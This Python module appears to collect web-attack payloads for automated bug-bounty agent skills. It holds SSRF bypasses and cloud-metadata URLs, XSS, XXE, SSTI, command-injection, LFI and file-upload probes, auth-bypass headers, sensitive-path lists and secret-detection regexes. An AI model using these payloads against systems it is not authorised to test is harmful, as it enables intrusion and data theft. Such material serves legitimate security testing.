"""Shared payload libraries for arena skills.

Centralizes the concrete attack strings each skill uses so that future
skills (SkillSsrf, SkillLfi, SkillPathTraversal, etc.) can import from a
single source of truth instead of redefining their own lists.

Sources:
  * SSRF_IP_BYPASSES — adapted from shuvonsec/claude-bug-bounty
    (skills/web2-vuln-classes/SKILL.md, MIT). See THIRD_PARTY_NOTICES.md.
  * Other constants — collected from common bug-bounty practice.

All values are inert strings; nothing executes on import.
"""
from __future__ import annotations

# ── SSRF: 127.0.0.1 / localhost representations that bypass naive blocklists ──
# Every entry below resolves to (or is interpreted as) loopback by some HTTP
# stack. Replace `localhost` / `127.0.0.1` in target URLs to probe for SSRF.
SSRF_LOOPBACK_VARIANTS = [
    "127.0.0.1",                # baseline
    "localhost",
    "2130706433",               # decimal
    "0177.0.0.1",               # octal
    "0x7f.0x0.0x0.0x1",         # hex octets
    "0x7f000001",               # full hex
    "127.1",                    # short form
    "127.0.1",                  # short form
    "[::1]",                    # IPv6 loopback
    "[::ffff:127.0.0.1]",       # IPv6-mapped IPv4
    "[::ffff:0x7f000001]",      # IPv6-mapped, hex
]

# Cloud metadata endpoints commonly reachable via SSRF.
SSRF_METADATA_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",                # AWS IMDSv1
    "http://169.254.169.254/latest/api/token",                 # AWS IMDSv2 token
    "http://metadata.google.internal/computeMetadata/v1/",     # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://100.100.100.200/latest/meta-data/",                # Alibaba
]

# ── Auth-bypass: HTTP headers asserting trusted origin / IP ───────────────────
AUTH_BYPASS_IP_HEADERS = [
    ("X-Forwarded-For",   "127.0.0.1"),
    ("X-Real-IP",         "127.0.0.1"),
    ("X-Originating-IP",  "127.0.0.1"),
    ("X-Remote-Addr",     "127.0.0.1"),
    ("X-Client-IP",       "127.0.0.1"),
    ("X-Forwarded-Host",  "localhost"),
    ("X-Host",            "localhost"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
]

AUTH_BYPASS_REWRITE_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
]

AUTH_BYPASS_METHOD_OVERRIDES = ["POST", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE"]

# Path-bypass suffixes appended to the URL path to confuse routing/auth.
AUTH_BYPASS_PATH_SUFFIXES = [
    "/", "//", "/./", "/%2e/", "/..;/", ";", "%00", "?", "#", ".json",
    ".html", ".xml", ".old", "/.", "/%20",
]

# ── API version patterns — for "old version lacks auth middleware" bypass ────
# Pattern: detect a /vN/ or /api/vN/ segment and try sibling versions or drop.
# Source: shuvonsec/claude-bug-bounty — "/v1/users/123 lacks auth that /v2/ has"
API_VERSION_REGEX = r"/(?:api/)?v(\d+)(?:\.(\d+))?/"
API_VERSION_ALTERNATES = ["v1", "v2", "v3", "v0", ""]   # "" = drop the segment

# ── XSS reflected vectors — context-aware ────────────────────────────────────
# Each marker is a unique random-ish string we expect echoed verbatim in the
# response if the param reflects without encoding. Skills look for the marker
# and check whether the surrounding bytes form an executable context.
XSS_MARKER = "zx9k7vqj"   # short, unlikely to clash with target content
XSS_REFLECTED_VECTORS = {
    "html_context": [
        f"<script>{XSS_MARKER}</script>",
        f"<img src=x onerror={XSS_MARKER}>",
        f"<svg/onload={XSS_MARKER}>",
    ],
    "attr_context": [
        f'" {XSS_MARKER}=x "',
        f"' {XSS_MARKER}=y '",
    ],
    "js_string": [
        f"';{XSS_MARKER};//",
        f'";{XSS_MARKER};//',
    ],
    "url_context": [
        f"javascript:{XSS_MARKER}//",
        f"data:text/html,{XSS_MARKER}",
    ],
    "raw": [XSS_MARKER],   # baseline reflection without metacharacters
}

# ── Open redirect bypass payloads ────────────────────────────────────────────
# Sources: shuvonsec/claude-bug-bounty + SnailSploit/Claude-Red SKILL.md (MIT).
# `{evil}` is replaced by the agent's chosen attacker host at probe time.
OPEN_REDIRECT_PAYLOADS = [
    "https://{evil}",
    "//{evil}",
    "/\\{evil}",
    "https:{evil}",
    "https://target@{evil}",
    "https://{evil}#@target",
    "//target.com.{evil}",
    "%2f%2f{evil}",
    "/%5c{evil}",
    "javascript://{evil}/%0Aalert(1)",
    "//{evil}/%2e%2e",
]

# ── CORS test origins ─────────────────────────────────────────────────────────
CORS_TEST_ORIGINS = [
    "https://evil.example",                     # arbitrary external origin
    "null",                                      # null origin (sandbox/file)
    "https://target.com.evil.example",           # subdomain confusion
    "https://evil.example.target.com",           # prefix confusion (regex flaws)
    "http://target.com",                         # protocol downgrade
]

# ── JWT weak-secret built-in dictionary ──────────────────────────────────────
# Tiny on-purpose — for serious cracking, agents should use jwt_tool externally.
# Just enough to catch the laziest defaults that repeatedly show up in the wild.
JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt", "token", "test",
    "default", "example", "changeme", "your-256-bit-secret", "supersecret",
    "qwerty", "letmein", "secretkey", "your_jwt_secret", "jwtsecret",
    "thisisverysecret", "MIIEpAIBAAKCAQEA",   # accidental committed key prefix
]

# ── SQLi error-pattern markers (lightweight pre-check before sqlmap) ─────────
# If any of these strings appear after injecting a single quote, sqlmap is
# almost certainly going to confirm. Source: standard error-based SQLi patterns.
SQLI_ERROR_MARKERS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array",
    "unclosed quotation mark",
    "incorrect syntax near",
    "sqlite3.operationalerror",
    "psycopg2.errors",
    "pg_query",
    "ora-01756", "ora-00933", "ora-00921",
    "odbc driver",
    "microsoft ole db provider",
    "sql server",
    "[ibm][cli driver][db2",
]

# ── SSTI evaluation markers — `{{49*49}}` should reflect as `2401` if eval ───
# Each tuple: (engine, payload, expected_marker_in_response)
SSTI_PAYLOADS = [
    ("Jinja2/Twig",  "{{49*49}}",                  "2401"),
    ("Jinja2/Twig",  "{{7*'7'}}",                  "7777777"),
    ("Freemarker",   "${49*49}",                   "2401"),
    ("Freemarker",   "<#assign x=\"x\"?eval>${x}", ""),     # error-leak path
    ("ERB/Ruby",     "<%= 49*49 %>",               "2401"),
    ("Velocity",     "#set($x=49*49)$x",           "2401"),
    ("Smarty",       "{$smarty.version}",          "Smarty"),
    ("Dust",         "{#7*7}{/7*7}",               "49"),
    ("Mako",         "${49*49}",                   "2401"),
    ("Tornado",      "{{49*49}}",                  "2401"),
]

# ── XXE inline file read payloads (Linux-targeted; OOB callbacks not used) ───
XXE_BODIES = [
    # External general entity referencing a local file.
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
    # Parameter entity (some parsers honor this even when general are blocked).
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "file:///etc/passwd">%x;]><r/>',
]
# Markers indicating successful file read.
XXE_RESPONSE_MARKERS = [
    "root:x:0:0:",                # /etc/passwd start
    "/bin/bash", "/bin/sh", "nologin",
    "daemon:x:",
]

# ── RCE command injection probes (Linux + Windows) ──────────────────────────
# Each entry: (payload, marker_regex_in_response, os_label)
RCE_PROBES = [
    # Linux: id command
    (";id",                  r"uid=\d+\([\w\-]+\)",   "Linux"),
    ("|id",                  r"uid=\d+\([\w\-]+\)",   "Linux"),
    ("`id`",                 r"uid=\d+\([\w\-]+\)",   "Linux"),
    ("$(id)",                r"uid=\d+\([\w\-]+\)",   "Linux"),
    ("&&id",                 r"uid=\d+\([\w\-]+\)",   "Linux"),
    # Linux: uname (stealthier — doesn't tend to be sandboxed/blocked)
    (";uname -a",            r"\b(Linux|Darwin)\s",   "Linux"),
    # Windows
    ("&&whoami",             r"^[\w\-]+\\[\w\-]+\s*$","Windows"),
    ("|whoami",              r"^[\w\-]+\\[\w\-]+\s*$","Windows"),
    ("&dir",                 r"<DIR>",                "Windows"),
]

# ── NoSQL injection — MongoDB-style operator payloads ──────────────────────
# Each entry: (param_value, response_signal). For string params, JSON object
# substitution lets agents bypass equality checks via $ne / $gt / $regex.
NOSQLI_PAYLOADS = [
    ('{"$ne": null}',     "auth_bypass"),
    ('{"$gt": ""}',       "auth_bypass"),
    ('{"$regex": ".*"}',  "auth_bypass"),
    ("[$ne]=null",        "operator_in_url"),    # URL-encoded operator form
    ("[$gt]=",            "operator_in_url"),
    ("'||'a'=='a",        "boolean_injection"),  # string-context boolean
    ('"||"a"=="a',        "boolean_injection"),
]
# Common signals that NoSQL is in play.
NOSQLI_ERROR_MARKERS = [
    "mongoerror", "mongodb",
    "redis::commanderror", "operatortypeerror",
    "couchdb", "mongoose",
    "no_such_database",
]

# ── LFI / Path Traversal payloads ───────────────────────────────────────────
# Encoding variants — different parsers/middleware behave differently.
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",                 # double-decoded sub-pattern
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",          # double-URL-encoded
    "/etc/passwd",                                   # absolute path test
    "file:///etc/passwd",                            # PHP wrapper
    "php://filter/convert.base64-encode/resource=index.php",  # PHP source disclosure
    "..\\..\\..\\windows\\win.ini",                  # Windows
    "/proc/self/environ",                            # Linux env disclosure
]
LFI_RESPONSE_MARKERS = [
    "root:x:0:0:",                                   # /etc/passwd
    "[fonts]", "[extensions]",                       # win.ini
    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=",            # /proc/self/environ
    "PD9waHA",                                        # base64("<?ph") — PHP source via filter
]

# ── File upload bypass payloads ─────────────────────────────────────────────
# Extension/MIME tricks the agent can permute around a sample uploaded file.
FILE_UPLOAD_BYPASSES = [
    # (filename, content_type, content_template)
    ("shell.php",                "image/png",                    "<?php echo md5('zg-poc'); ?>"),
    ("shell.php.png",            "image/png",                    "<?php echo md5('zg-poc'); ?>"),
    ("shell.png.php",            "image/png",                    "<?php echo md5('zg-poc'); ?>"),
    ("shell.php%00.png",         "image/png",                    "<?php echo md5('zg-poc'); ?>"),  # null-byte trick
    ("shell.pHp",                "image/png",                    "<?php echo md5('zg-poc'); ?>"),  # case bypass
    ("shell.phtml",              "image/png",                    "<?php echo md5('zg-poc'); ?>"),
    ("shell.phar",               "image/png",                    "<?php echo md5('zg-poc'); ?>"),
    ("..%2fshell.php",           "image/png",                    "<?php echo md5('zg-poc'); ?>"),  # path traversal in name
    ("shell.svg",                "image/svg+xml",                '<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'),
    ("shell.html",                "image/png",                    "<script>alert(1)</script>"),
]
# Marker proving the uploaded file got served back as code (PHP execution).
FILE_UPLOAD_EXEC_MARKER = "fcd7e8d0e30a7e2a6d3e4e1ee0d0d0e0"  # md5('zg-poc')

# ── HTTP Request Smuggling probes (CL.TE / TE.CL detection) ─────────────────
# The classic "differential parsing" probes — front-end and back-end disagree
# about how to parse Content-Length vs Transfer-Encoding. We don't smuggle a
# real attack request; we just measure timing to detect the parser disagreement.
SMUGGLING_PROBE_CL_TE = (
    # Content-Length says 4, body has more after the chunked terminator.
    # If CL.TE is exploitable, the back-end waits for more bytes (timeout).
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "A\r\n"
    "Q\r\n"   # Stale "next request" body — back-end expects this if it honors TE
)
SMUGGLING_PROBE_TE_CL = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "X"
)

# ── Race condition probe — concurrent identical requests ────────────────────
RACE_DEFAULT_BURST_SIZE = 25       # how many concurrent requests to send
RACE_DEFAULT_TIMEOUT    = 10       # per-request timeout

# ── CSRF — common token field names + cookie-flag detection ────────────────
# Hidden inputs / header names that act as CSRF tokens. If a form has any of
# these AND the cookie has SameSite, CSRF is probably defended.
CSRF_TOKEN_NAMES = [
    "csrf_token", "csrftoken", "csrfmiddlewaretoken", "_csrf", "_token",
    "authenticity_token", "__RequestVerificationToken", "anti_csrf",
    "x-csrf-token", "x-xsrf-token", "csrf", "xsrf", "_xsrf",
    "request_token", "form_token", "form_key",
]

# State-changing keywords — when found in a path/action, the endpoint is
# considered "state-changing" and CSRF/access-control bugs are critical.
STATE_CHANGE_KEYWORDS = [
    "password", "email", "transfer", "delete", "remove", "create", "update",
    "settings", "profile", "admin", "user", "account", "invite",
    "permission", "role", "logout", "subscribe", "checkout",
]

# ── Access-control — admin / sensitive paths to enumerate ──────────────────
# All entries are RELATIVE paths that get appended to the host root.
ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin.php",
    "/administrator", "/administrator/index.php",
    "/wp-admin/", "/wp-login.php",
    "/console", "/manager/html", "/cpanel",
    "/dashboard", "/internal", "/portal",
    "/users", "/api/users", "/api/v1/users", "/api/v2/users", "/api/admin",
    "/api/v1/admin", "/api/v2/admin", "/api/admin/users",
    "/server-status", "/server-info", "/status",
    "/phpinfo.php", "/info.php", "/test.php",
    "/debug", "/_profiler", "/actuator", "/actuator/env", "/actuator/heapdump",
    "/swagger.json", "/api/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/graphiql", "/api/graphql",
    "/health", "/healthcheck", "/metrics", "/prometheus",
    "/.well-known/security.txt",
]

# Sensitive file paths — disclosure means trouble (creds, source, infra).
SENSITIVE_FILE_PATHS = [
    "/.env", "/.env.local", "/.env.production",
    "/.git/config", "/.git/HEAD",
    "/.svn/entries",
    "/.htaccess", "/.htpasswd",
    "/web.config", "/WEB-INF/web.xml",
    "/config.json", "/config.yaml", "/config.yml",
    "/credentials", "/credentials.json",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql", "/db.sql",
    "/composer.json", "/package.json", "/yarn.lock",
    "/robots.txt",            # not sensitive itself but often reveals paths
    "/sitemap.xml",
    "/CHANGELOG", "/CHANGELOG.md",
    "/.DS_Store",
]

# ── API testing — mass-assignment field probes ─────────────────────────────
# When POST/PATCH/PUT a JSON body, append these fields and check whether the
# server reflects elevated privilege OR the response shape changes meaningfully.
MASS_ASSIGNMENT_FIELDS = [
    {"is_admin":     True},
    {"role":         "admin"},
    {"role":         "superadmin"},
    {"isAdmin":      True},
    {"is_superuser": True},
    {"verified":     True},
    {"email_verified": True},
    {"premium":      True},
    {"balance":      999999},
    {"credit":       999999},
    {"user_id":      1},
    {"id":           1},
    {"permissions":  ["admin", "*", "all"]},
]

# HTTP Parameter Pollution — duplicate-param injection vectors
HPP_INJECTIONS = [
    # tuple of (extra_param_name, extra_value, description)
    ("role",        "admin",      "role override"),
    ("admin",       "true",       "admin flag inject"),
    ("user_id",     "1",          "user_id override"),
    ("id",          "1",          "id override"),
    ("debug",       "true",       "debug-mode toggle"),
]

# ── JS secret regex catalog — credential leak detection ────────────────────
# Each entry: (label, regex, severity_when_matched, redact_match)
# `redact_match` controls whether we keep the full match or only the prefix
# in the evidence string (don't echo live secrets verbatim into shared state).
import re as _re
SECRET_REGEX_CATALOG = [
    ("AWS Access Key",     _re.compile(r"\b(AKIA[0-9A-Z]{16})\b"),                   "critical", True),
    ("AWS Secret Key",     _re.compile(r"(?i)aws(.{0,20})?['\"][0-9a-zA-Z/+]{40}['\"]"), "critical", True),
    ("AWS Temporary Key",  _re.compile(r"\b(ASIA[0-9A-Z]{16})\b"),                   "critical", True),
    ("GitHub PAT",         _re.compile(r"\b(gh[psoru]_[A-Za-z0-9]{36,251})\b"),      "critical", True),
    ("GitHub OAuth",       _re.compile(r"\b(gho_[A-Za-z0-9]{36})\b"),                "critical", True),
    ("Slack Token",        _re.compile(r"\b(xox[baprs]-[A-Za-z0-9-]{10,})\b"),       "critical", True),
    ("Slack Webhook",      _re.compile(r"https://hooks\.slack\.com/services/T[A-Za-z0-9_/-]+"), "high", False),
    ("Stripe Live Secret", _re.compile(r"\b(sk_live_[0-9a-zA-Z]{24,})\b"),           "critical", True),
    ("Stripe Test Secret", _re.compile(r"\b(sk_test_[0-9a-zA-Z]{24,})\b"),           "high",     True),
    ("Stripe Restricted",  _re.compile(r"\b(rk_live_[0-9a-zA-Z]{24,})\b"),           "critical", True),
    ("Twilio SID",         _re.compile(r"\b(AC[a-fA-F0-9]{32})\b"),                  "high",     True),
    ("Twilio Token",       _re.compile(r"\b(SK[a-fA-F0-9]{32})\b"),                  "critical", True),
    ("SendGrid API Key",   _re.compile(r"\b(SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})\b"), "critical", True),
    ("Mailgun API Key",    _re.compile(r"\b(key-[0-9a-f]{32})\b"),                   "high",     True),
    ("Google API Key",     _re.compile(r"\b(AIza[0-9A-Za-z\-_]{35})\b"),             "high",     True),
    ("Google OAuth ID",    _re.compile(r"\b([0-9]+-[a-z0-9]{32}\.apps\.googleusercontent\.com)\b"), "low", False),
    ("GCP Service Account",_re.compile(r'"type":\s*"service_account"'),              "critical", False),
    ("Heroku API Key",     _re.compile(r"(?i)heroku['\"\s:=]{1,5}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"), "high", True),
    ("Firebase URL",       _re.compile(r"https://[a-z0-9-]+\.firebaseio\.com"),      "medium",   False),
    ("Private Key Block",  _re.compile(r"-----BEGIN\s+(?:RSA|DSA|EC|OPENSSH|PRIVATE)\s+PRIVATE KEY"), "critical", False),
    ("JWT Token",          _re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"), "medium", True),
    ("Generic API Key",    _re.compile(r"(?i)api[-_]?key['\"\s:=]{1,5}['\"]([A-Za-z0-9_\-]{32,})['\"]"), "medium", True),
    ("Generic Secret",     _re.compile(r"(?i)secret['\"\s:=]{1,5}['\"]([A-Za-z0-9_\-]{16,})['\"]"), "medium", True),
    ("Generic Password",   _re.compile(r"(?i)password['\"\s:=]{1,5}['\"]([^'\"]{6,})['\"]"), "medium", True),
    ("Database URL",       _re.compile(r"(?:postgres|postgresql|mysql|mongodb|redis)://[^\s'\"<>]{8,}"), "high", True),
    ("Bearer Token Inline",_re.compile(r"(?i)bearer\s+([A-Za-z0-9_\-\.=]{20,})"),    "high",     True),
]

# ── GraphQL introspection probe ─────────────────────────────────────────────
GRAPHQL_INTROSPECTION_QUERY = (
    '{"query":"query IntrospectionQuery {__schema {queryType {name} mutationType {name} '
    'types {name kind fields {name type {name kind ofType {name kind}}}}}}"}'
)
GRAPHQL_BATCH_PROBE = (
    '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
)

# ── Subdomain takeover CNAME fingerprints (extends services/takeover.py) ─────
# We mostly defer to services/takeover.py.TAKEOVER_SIGNATURES, but expose a
# few extra modern ones for the skill that don't live there yet.
TAKEOVER_EXTRA_FINGERPRINTS = [
    # (cname_substring, response_marker, service_name)
    ("vercel-dns.com",        "The deployment could not be found",  "Vercel"),
    ("netlify.app",           "Not Found - Request ID:",             "Netlify"),
    ("ghost.io",              "The thing you were looking for is no longer here", "Ghost"),
    ("readme.io",             "Project doesnt exist",                "Readme"),
    ("statuspage.io",         "You are being redirected",            "Statuspage"),
    ("zendesk.com",           "Help Center Closed",                  "Zendesk"),
]
